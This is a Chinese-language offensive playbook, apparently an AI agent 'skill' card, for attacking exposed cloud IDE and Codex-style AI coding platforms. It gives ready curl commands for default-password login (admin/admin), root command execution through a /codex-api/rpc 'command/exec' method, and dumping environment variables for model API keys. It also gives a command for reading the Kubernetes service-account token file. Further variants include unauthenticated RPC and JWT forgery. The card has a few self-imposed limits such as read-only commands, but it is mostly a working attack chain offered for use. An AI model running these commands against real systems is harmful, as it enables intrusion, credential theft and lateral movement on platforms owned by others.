---
name: 盗天·文台
description: >-
  云 IDE / Codex 系 AI 编程平台：弱口令→Root RCE→凭证链。
  公网暴露的 AI 编程控制台（含 OpenAI Codex 系、各厂编程助手）：
  `/tenant-api/login` 裸默认口 → `/codex-api/rpc` method=command/exec root →
  env 读集群 SA + 模型 API Key + 邀请码 → 额度消耗/横向/持久化。
  三层链路：认证缺陷（弱口令/零认证/固定邀请码/JWT 弱密钥）→
  危险 RPC（command/exec + fs 读写 + meta/methods 面枚举）→
  容器/集群凭证链（KUBERNETES_SERVICE_HOST + SA token）。
  同构变体：零认证 RPC、注册接口+固定邀请码、JWT 伪造、WebSocket 网关。
  
  对话口工具真执行（非 RPC）走 agentic-actions-auditor。
version: 1.0.0
metadata:
    tags:
      - cloud-ide
      - codex
      - ai-platform
      - rpc
      - rce
      - weak-password
      - kubernetes
      - sa-token
      - api-key
      - container-escape
      - command-exec
      - tenant-api
    category: web-application
    priority: 1
    attack_phases: [recon, exploit, post-exploit]
    target_stack: [openai-codex, node, kubernetes, docker]
---

> **盗天**
> 自身本是轮回客，踏遍万里寻归途！
> 盗亦有道留一线，手到偷来不问途。

# 云 IDE / Codex 系 AI 编程平台 — 弱口令→Root RCE→凭证链

> 类型：认证缺陷 + 危险 RPC + 容器/集群凭证链

---

## 核心链路

```
弱口令/未授权登录 → 租户会话(JWT/Cookie)
  → POST /codex-api/rpc method=command/exec（root）
  → env / fs 读集群 SA + 模型 API Key + 邀请码
  → 额度消耗 / 潜在横向 / 持久化
```

---

## 1. 模式画像（看到就测）

| 特征 | 示例 |
|------|------|
| 域名/产品 | AI 编程助手、playbook、Codex 系控制台 |
| 路径 | `/tenant-api/login`、`/codex-api/rpc`、`/tenant-api/*` |
| 框架痕迹 | OpenAI Codex、`@openai/codex`、thread/model RPC |
| 环境 | dev / pre / fat / gray / sandbox（**DEV 优先扫**） |
| 默认账密 | `admin/admin`、`admin/123456` |

---

## 2. 最小探测矩阵

### 2.1 指纹

```bash
# 登录面
curl -sk -o /dev/null -w "%{http_code}" -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# RPC 面（无 Cookie 也要看）
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"meta/methods","params":{}}'
```

### 2.2 弱口令

```bash
curl -sk -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -D -
```

### 2.3 RCE + 凭证

```bash
# 命令执行
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -b "tenant_session=SESSION" -H "Content-Type: application/json" \
  -d '{"method":"command/exec","params":{"command":["id"]}}'

# 文件系统
-d '{"method":"fs/readDirectory","params":{"path":"/"}}'
-d '{"method":"fs/readFile","params":{"path":"/etc/os-release"}}'

# 环境变量（密钥）
-d '{"method":"command/exec","params":{"command":["env"]}}'

# 集群 SA token
-d '{"method":"command/exec","params":{"command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]}}'
```

### 危险方法清单

| method | 含义 |
|--------|------|
| `command/exec` | 任意命令 |
| `fs/readFile` / `fs/writeFile` / `fs/remove` | 文件系统 |
| `meta/methods` | 能力面枚举 |
| `thread/start` / `model/list` | AI 会话与模型 |

---

## 3. 同构变体

1. **零认证 RPC**：无 Cookie 直接 `command/exec`
2. **注册接口 + 固定邀请码**：env 或前端硬编码 `TENANT_INVITE_CODE`
3. **JWT 弱密钥 / 算法 none**：`tenant_session` 伪造 admin
4. **WebSocket**：同源 Codex 走 WS 推命令
5. **多租户隔离**：普通用户是否也能 `command/exec`（垂直越权 RCE）

---

## 4. 假点

- 通配符证书临时实例随时销毁 → 不算打穿
- 只登录没有 RPC → 半条链，继续挖
- 模型只口头说执行了、数字对不上 → 不算
- 沙箱 `uid=` 不算 root

---

## 5. 操作纪律

- 命令执行只做 **id / hostname / 只读 cat**，禁止破坏性写
- 密钥脱敏策略按平台要求
- 价值在 **RCE + 密钥 + 集群**，别停在能传能下
- 认到只打当前站，禁止开新种子 FOFA 全网同皮

## 真源

- 手法：`传承/红衣·壳.md`（云 IDE / Codex RPC 全链以本卡正文为准）
- 工具：`python3 炼蛊房/strike_probe.py --help`
- 对话口工具真执行（非 RPC）走 `杀招/自走`
